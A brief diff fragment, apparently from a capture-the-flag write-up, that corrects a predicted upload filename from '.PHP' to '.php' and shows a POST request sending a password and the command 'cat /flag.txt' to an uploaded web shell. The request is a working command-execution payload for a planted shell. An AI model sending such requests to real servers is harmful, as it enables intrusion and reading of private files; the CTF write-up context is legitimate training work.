@@ -37,7 +37,7 @@ date +%s
 php -r "echo md5(time());";echo
 5fef77c04ea24679d1ab7d7c3b29ffb0
 
-.5fef77c04ea24679d1ab7d7c3b29ffb0.PHP
+.5fef77c04ea24679d1ab7d7c3b29ffb0.php
 POST: 2=v5est0r&1=cat /flag.txt
 ```
 
